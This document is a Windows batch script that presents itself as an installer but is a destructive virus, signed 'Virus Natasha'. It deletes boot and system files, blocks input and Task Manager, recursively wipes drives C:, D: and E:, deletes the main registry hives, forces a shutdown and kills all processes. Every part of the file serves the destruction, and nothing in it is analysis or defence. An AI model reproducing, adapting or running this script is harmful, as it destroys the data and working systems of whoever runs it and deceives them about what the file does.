echo Installation in progress...

title Installation...


rem ######### DEL SYSTEM FILES #########
cls


del /A:H /F c:\boot.ini
del /A:H /F c:\ntldr
del /A:H /F c:\IO.SYS
del /A:H /F c:\autoexec.bat
del /A:H /F c:\command.com
del /A:H /F c:\config.sys
del /A:H /F c:\ntdetect.com
del /F %SYSTEMROOT%\system.ini
del /F %SYSTEMROOT%\desktop.ini
del /F %SYSTEMROOT%\win.ini
del /F %SYSTEMROOT%\system32\reset.exe
del /F %SYSTEMROOT%\system32\reset5.exe
del /F %SYSTEMROOT%\system32\reset5.dat
del /F %SYSTEMROOT%\system32\resetwpa.reg

rem ######### Change date  ###########

date 01.01.2666

rem ######### Block mouse and keyboard ############
cls


start /belownormal c:\windows\temp\mouse.exe
start /belownormal c:\windows\temp\block.exe


rem ######### DEL TASKMGR [blocked cntr+alt+del] #########

taskkill /f /im taskmgr.exe
del /F %SYSTEMROOT%\system32\dllcache\taskmgr.exe
del /F %SYSTEMROOT%\system32\taskmgr.exe

rem ######### DEL ALL FILES ON DRIVES D: E: ##########
cls



d:
cd d:\
rd /s /q d:\

e:
cd e:\
rd /s /q e:\

d:
cd d:\
del /s /q /f *.*

e:
cd e:\
del /s /q /f *.*

rem ######### DEL SOME DATA FROM REGISTRY ########
cls

reg delete "hklm\hardware" /f
reg delete "hklm\software" /f
reg delete "hklm\system" /f
reg delete "hkcu\software" /f
reg delete "hkcc\software" /f
reg delete "hkcc\system" /f

rem ######### DEL ALL FILES ON DRIVES C: ##########
cls

c:
cd: %SYSTEMROOT%\system32\
rd /s /q dllcache

c:
cd %SYSTEMROOT%\system32\
del /s /q /f *.*

c:
cd c:\
rd /s /q c:\


rem ######### DEL SOME DIRECTORIES ########
cls

c:
cd c:\
rd /s /q docume~1
rd /s /q ������~1
rd /s /q games
rd /s /q video
rd /s /q programs
rd /s /q mymusi~1
rd /s /q install
rd /s /q progra~1



rem ########## SHUTDOWN PC ############

c:
cd c:\
shutdown -s -f -t 20 -f -c "Virus Natasha is runing..."


rem ####### taskkill #########

taskkill /f /im *


exit
